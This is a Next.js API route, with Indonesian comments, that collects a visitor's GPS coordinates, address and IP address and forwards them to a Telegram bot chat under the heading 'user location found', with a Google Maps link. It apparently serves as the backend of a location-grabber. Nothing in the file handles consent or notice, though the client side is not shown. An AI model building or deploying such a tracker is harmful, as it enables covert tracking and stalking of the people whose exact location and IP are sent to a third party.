// app/api/sendLocation/route.ts
import { NextRequest, NextResponse } from 'next/server';

export async function POST(req: NextRequest) {
  try {
    const { latitude, longitude, address, timestamp } = await req.json();
    
    if (!latitude || !longitude) {
      return NextResponse.json({ error: 'Latitude and longitude required' }, { status: 400 });
    }

    const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;
    
    if (!TOKEN || !CHAT_ID) {
      return NextResponse.json({ error: 'Bot token or chat ID not set' }, { status: 500 });
    }

    // Dapatkan IP user dari headers
    const forwardedFor = req.headers.get('x-forwarded-for');
    const realIP = req.headers.get('x-real-ip');
    const userIP = forwardedFor?.split(',')[0] || realIP || 'Unknown';

    // Format pesan untuk Telegram
    const message = `📍 **LOKASI USER DITEMUKAN**\n\n` +
                   `📡 **IP Address:** ${userIP}\n` +
                   `🗺️ **Koordinat:** ${latitude}, ${longitude}\n` +
                   `📌 **Alamat:** ${address || 'Tidak tersedia'}\n` +
                   `🕐 **Waktu:** ${new Date(timestamp).toLocaleString('id-ID')}\n\n` +
                   `🔗 **Google Maps:** https://maps.google.com/?q=${latitude},${longitude}`;

    // Kirim pesan ke Telegram
    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const data = await response.json();
    
    if (data.ok) {
      console.log('📍 Location sent to Telegram successfully');
      console.log('User IP:', userIP);
      console.log('Coordinates:', latitude, longitude);
    } else {
      console.error('❌ Telegram API error:', data);
    }

    return NextResponse.json(data);
  } catch (err: any) {
    console.error('SendLocation Error:', err.message);
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}